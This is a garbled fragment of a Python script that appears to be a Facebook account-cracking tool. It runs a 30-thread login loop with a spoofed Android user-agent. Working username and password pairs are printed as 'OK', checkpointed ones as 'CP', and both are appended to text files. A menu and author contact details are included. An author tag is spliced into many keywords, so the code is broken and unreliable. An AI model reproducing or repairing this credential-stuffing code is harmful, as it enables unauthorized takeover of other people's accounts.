...
from concurrent.futures import ThreadPoolExecutorMAHABUBBIR ssb
...
header_grup = {"user-agentMozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;uacq]"}
...
__________________×______________________
  ...
  Auther Mahabub ViLAM 
 
  Github   :https://github.Saniatrrr005 

  Faceboo⭐⭐⭐⭐LAM 
  
  Contact :+830885369772
...
MAHABUBBIR ():
    ...
    print(' [3] BACK')
    print('')
 MAHABUBBIR ___ = input(' [?] Choose option : ')
    MAHABUBBIR ___ in ('1', '01'):
        __xxx_MAHABUBBIR x(id)
    MAHABUBBIR ___ in ('2', '02'):
        os.system("python Beta.py")
    MAHABUBBIR ___ in ('E', 'ee'):
...
class __xxx__:
    ...
    'viewport-width': '980',
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{MAHABUBBIR -OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    opMAHABUBBIR _OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\rMAHABUBBIR -CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        opmahabubBIR _CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            wMAHABUBBIR ssb(max_workers=30) as ssbworld:
